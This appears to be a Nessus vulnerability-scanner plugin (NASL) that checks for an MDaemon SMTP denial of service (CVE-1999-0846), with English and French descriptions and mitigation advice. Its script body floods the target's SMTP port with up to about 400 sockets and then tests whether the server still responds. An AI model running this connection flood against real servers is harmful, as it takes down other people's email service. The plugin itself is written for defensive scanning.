#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# References:
# Date: Sun, 27 Oct 2002 19:49:45 +0300
# From: "D4rkGr3y" <grey_1999@mail.ru>
# To: bugtraq@securityfocus.com, submissions@packetstormsecurity.com, 
#   vulnwatch@vulnwatch.org
# Subject: MDaemon SMTP/POP/IMAP server DoS
# 

if(description)
{
 script_id(10137);
 script_bugtraq_id(8554);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-1999-0846");
 
 name["english"] = "MDaemon DoS";
 name["francais"] = "Déni de service MDaemon";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to crash the remote SMTP server
by opening a great amount of sockets on it.


This problem allows an attacker to make your
SMTP server crash, thus preventing you
from sending or receiving e-mails, which
will affect your work.


*** Note that due to the nature of this vulnerability,
*** Nessus can not be 100% positive on the effectiveness of
*** this flaw. As a result, this report might be a false positive

Solution : 
If your SMTP server is constrained to a maximum
number of processes, i.e. it's not running as
root and as a ulimit 'max user processes' of
256, you may consider upping the limit with 'ulimit -u'.

If your server has the ability to protect itself from
SYN floods, you should turn on that features, i.e. Linux's CONFIG_SYN_COOKIES

The best solution may be Cisco's 'TCP intercept' feature.


Risk factor : High";


 desc["francais"] = "Il s'est avéré possible de faire
planter le serveur SMTP distant en ouvrant un grand
nombre de connections dessus.

Ce problème permet à des pirates de faire
planter votre serveur SMTP, vous empechant
ainsi d'envoyer et de recevoir des emails,
ce qui affectera votre travail.

Solution : contactez votre vendeur pour un patch.

Facteur de risque : Sérieux";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote MTA";
 summary["francais"] = "Fait planter le MTA distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 if (ACT_FLOOD) script_category(ACT_FLOOD);
 else		script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("smtpserver_detect.nasl", "sendmail_expn.nasl");
 script_exclude_keys("SMTP/wrapped");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#


include("smtp_func.inc");

port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

if(get_port_state(port))
{
 i = 0;
 ref_soc = open_sock_tcp(port);
 if ( ! ref_soc ) exit(0);
 banner = smtp_recv_line(socket:ref_soc);
 
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 while(TRUE)
 {
  soc = open_sock_tcp(port);
  if(!soc){
  	sleep(5);
	soc2 = open_sock_tcp(port);
	if(!soc2){
	 send(socket:ref_soc, data:'HELP\r\n');
         out = smtp_recv_line(socket:ref_soc);
         if ( ! out ) security_hole(port);
         }
	else close(soc2);
        close(ref_soc);
	exit(0);
    }
  if( i > 400)
  {
        close(ref_soc);
 	exit(0);
  }
  i = i + 1;
 }
}
